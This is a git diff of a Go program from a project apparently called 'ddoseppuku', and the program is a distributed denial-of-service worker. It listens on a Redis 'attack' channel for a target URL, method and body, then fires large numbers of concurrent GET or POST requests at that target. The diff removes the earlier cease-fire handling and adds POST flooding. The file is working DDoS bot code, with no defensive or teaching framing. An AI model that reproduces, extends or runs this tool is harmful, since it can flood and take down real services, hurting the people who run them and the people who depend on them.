@@ -1,15 +1,14 @@
 package main
 
 import (
-	"context"
+	"bytes"
+	"encoding/json"
 	"log"
 	"net/http"
-	"strings"
-	"sync"
-	"time"
 
 	"github.com/go-redis/redis"
 	"github.com/michaeloverton/ddoseppuku/internal/env"
+	"github.com/michaeloverton/ddoseppuku/internal/message"
 	"github.com/sirupsen/logrus"
 )
 
@@ -18,7 +17,6 @@ import (
 // possible reference:
 // http://craigwickesser.com/2015/01/golang-http-to-many-open-files/
 // https://mtyurt.net/post/docker-how-to-increase-number-of-open-files-limit.html
-
 func main() {
 	// Load the laser environment.
 	env, err := env.LoadLaserEnv()
@@ -43,108 +41,80 @@ func main() {
 	}
 
 	// Subscribe to the attack topic.
-	attackTopic := subClient.Subscribe("topic")
+	attackTopic := subClient.Subscribe("attack")
 	attackChan := attackTopic.Channel()
-
-	// Subscribe to the quit topic.
-	quitTopic := subClient.Subscribe("quit")
-	sentinelQuitChan := quitTopic.Channel()
-
-	laserQuitChan := make(chan bool)
 
 	// When a message is received, attack target.
 	for {
 		select {
 		case m := <-attackChan:
-			logrus.Info("new attack on URL: ", m.Payload)
-			go makeRequests(httpClient, m.Payload, env.MaxRequests, laserQuitChan)
-		case <-sentinelQuitChan:
-			logrus.Info("cease fire")
-			laserQuitChan <- true
-			// return
+			// Unmarshal attack message.
+			var attackMsg message.Message
+			if err := json.Unmarshal([]byte(m.Payload), &attackMsg); err != nil {
+				logrus.Error("failed to attack message unmarshal: ", err)
+				return
+			}
+
+			logrus.Info(attackMsg)
+			go makeRequests(httpClient, attackMsg, env.MaxRequests)
 		}
 	}
 
 }
 
-func makeRequests(c http.Client, URL string, maxRequests int, quitChan chan bool) {
+func makeRequests(c http.Client, attackMsg message.Message, maxRequests int) {
 	// Current number of requests we have made.
 	requestCount := 0
-
-	// Create cancellable context that  all requests will share.
-	cancelCtx, cancel := context.WithCancel(context.Background())
-	defer cancel()
-
 	for {
-		select {
-		// case <-cancelCtx.Done():
-		// 	return
-		case <-quitChan:
-			// When we receive a quit signal, cancel the context, so requests will be cancelled.
-			logrus.Info("stopping requests")
-			cancel()
-			return
-		default:
-			if requestCount < maxRequests {
-				// If we have not maxed  out requests, concurrently make request to target.
-				go func() {
-
-					// Create the request to the target.
-					req, err := http.NewRequestWithContext(cancelCtx, "GET", URL, nil)
+		if requestCount < maxRequests {
+			// If we have not maxed  out requests, concurrently make request to target.
+			go func() {
+				// Create the request to the target - it will always be either GET or POST.
+				var req *http.Request
+				var err error
+				if attackMsg.Method == http.MethodGet {
+					// Form GET request.
+					req, err = http.NewRequest(http.MethodGet, attackMsg.URL, nil)
 					if err != nil {
 						logrus.Errorf("failed to create request: %s", err)
 						return
 					}
+				} else {
+					// Otherwise, we want POST requests.
 
-					// Make the request.
-					res, err := c.Do(req)
+					// Marshal the body from the message.
+					js, err := json.Marshal(attackMsg.Body)
 					if err != nil {
-						// If we cancelled the request context, then ignore the error.
-						if strings.Contains(err.Error(), "context canceled") {
-							logrus.Tracef("request failed: %s", err)
-							return
-						}
-						logrus.Errorf("request failed: %s", err)
+						logrus.Errorf("failed to marshal request body: %s", err)
 						return
 					}
-					defer res.Body.Close()
 
-					logrus.Info("status: ", res.StatusCode)
-				}()
+					// Form POST request.
+					req, err = http.NewRequest(http.MethodPost, attackMsg.URL, bytes.NewReader(js))
+					if err != nil {
+						logrus.Errorf("failed to create request: %s", err)
+						return
+					}
+				}
 
-				// Increment the number of requests we have made.
-				requestCount++
-			} else {
-				// If we've reached max requests, just chill.
-				logrus.Info("chilling")
-				time.Sleep(5 * time.Second)
-			}
+				// Make the request.
+				res, err := c.Do(req)
+				if err != nil {
+					logrus.Errorf("request failed: %s", err)
+					return
+				}
+				defer res.Body.Close()
+
+				logrus.Info("status: ", res.StatusCode)
+			}()
+
+			// Increment the number of requests we have made.
+			requestCount++
+		} else {
+			// If we've reached max requests, return.
+			logrus.Info("end")
+			return
 		}
 	}
-
-}
-
-func makeRequest(c http.Client, URL string, wg *sync.WaitGroup) {
-	logrus.Infof("making request to: %s", URL)
-
-	// Create the request to the target.
-	req, err := http.NewRequest("GET", URL, nil)
-	if err != nil {
-		logrus.Errorf("failed to create request: %s", err)
-		return
-	}
-
-	// Make the request.
-	res, err := c.Do(req)
-	if err != nil {
-		logrus.Errorf("request failed: %s", err)
-		return
-	}
-	defer res.Body.Close()
-
-	// Log response.
-	logrus.Info("response code:", res.StatusCode)
-
-	wg.Done()
 
 }
